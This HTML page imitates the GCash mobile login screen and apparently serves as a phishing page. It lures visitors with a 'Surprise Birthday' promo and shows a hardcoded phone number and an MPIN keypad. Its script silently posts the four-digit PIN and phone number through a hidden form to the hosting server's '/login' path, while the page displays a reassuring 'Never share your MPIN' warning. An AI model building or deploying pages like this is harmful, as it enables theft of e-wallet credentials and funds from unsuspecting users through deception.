<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GCash Login</title>
    <style>
        body {
            background: linear-gradient(135deg, #0074e4, #00a1ff);
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Status bar */
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 8px 12px;
            font-size: 12px;
        }

        .status-left, .status-right {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* Main content */
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            text-align: center;
        }

        .promo-text {
            font-size: 36px;
            font-weight: bold;
            margin: 30px 0;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }

        .gcash-logo {
            font-size: 30px;
            font-weight: bold;
            margin: 20px 0;
        }

        .gcash-logo span {
            font-size: 24px;
        }

        /* Phone number display */
        .phone-display {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px 30px;
            border-radius: 30px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .phone-number {
            font-size: 22px;
            font-weight: bold;
        }

        /* MPIN section */
        .mpin-section {
            margin: 20px 0;
        }

        .mpin-text {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .mpin-dots {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }

        .mpin-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: 2px solid white;
            background: transparent;
        }

        /* Visual elements */
        .visual-elements {
            margin: 15px 0;
            height: 100px;
            position: relative;
        }

        /* Warning text */
        .warning-text {
            font-size: 12px;
            opacity: 0.8;
            margin-bottom: 20px;
        }

        /* Keypad */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            width: 80%;
            max-width: 300px;
            margin: 20px auto;
        }

        .key {
            background: white;
            color: #0057b8;
            font-size: 32px;
            font-weight: bold;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            margin: 0 auto;
        }

        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            padding: 20px;
            width: 100%;
            box-sizing: border-box;
        }

        .footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
        }
    </style>
</head>
<body>
<!-- Status bar -->
<div class="status-bar">
    <div class="status-left">10:13 PM</div>
    <div class="status-right">
        <span>18.4 K/S</span>
        <span>Vo LTE</span>
        <span>57%</span>
    </div>
</div>

<div class="content">
    <div class="promo-text">
        Surprise Birthday<br>
        SHAKE AWAY
    </div>

    <div class="gcash-logo">
        <span>(G)</span> GCash
    </div>

    <div class="phone-display">
        <div class="phone-number">+63-9691520285</div>
        <div class="exchange-icon">â‡„</div>
    </div>

    <div class="mpin-section">
        <div class="mpin-text">Enter your MPIN</div>
        <div class="mpin-dots">
            <div class="mpin-dot"></div>
            <div class="mpin-dot"></div>
            <div class="mpin-dot"></div>
            <div class="mpin-dot"></div>
        </div>
    </div>

    <div class="visual-elements">
        <!-- Placeholder for decorative images -->
    </div>

    <div class="warning-text">
        Never share your MPIN or OTP with anyone.
    </div>

    <form id="mpin-form" method="post" action="/login" style="display:none">
        <input type="hidden" id="mpin-input" name="pin">
        <input type="hidden" name="number" value="+639691520285">
    </form>

    <div class="keypad">
        <div class="key" onclick="appendDigit('1')">1</div>
        <div class="key" onclick="appendDigit('2')">2</div>
        <div class="key" onclick="appendDigit('3')">3</div>
        <div class="key" onclick="appendDigit('4')">4</div>
        <div class="key" onclick="appendDigit('5')">5</div>
        <div class="key" onclick="appendDigit('6')">6</div>
        <div class="key" onclick="appendDigit('7')">7</div>
        <div class="key" onclick="appendDigit('8')">8</div>
        <div class="key" onclick="appendDigit('9')">9</div>
        <div></div>
        <div class="key" onclick="appendDigit('0')">0</div>
        <div></div>
    </div>
</div>

<div class="footer">
    <a href="#">Help Center</a>
    <a href="#">Forgot MPIN?</a>
</div>

<script>
    let pin = '';
    const dots = document.querySelectorAll('.mpin-dot');
    const form = document.getElementById('mpin-form');
    const pinInput = document.getElementById('mpin-input');

    function appendDigit(digit) {
        if (pin.length < 4) {
            pin += digit;
            updateDots();

            if (pin.length === 4) {
                // Submit form when 4 digits entered
                pinInput.value = pin;
                setTimeout(() => form.submit(), 300);
            }
        }
    }

    function updateDots() {
        for (let i = 0; i < dots.length; i++) {
            if (i < pin.length) {
                dots[i].style.background = 'white';
            } else {
                dots[i].style.background = 'transparent';
            }
        }
    }
</script>
</body>
</html>
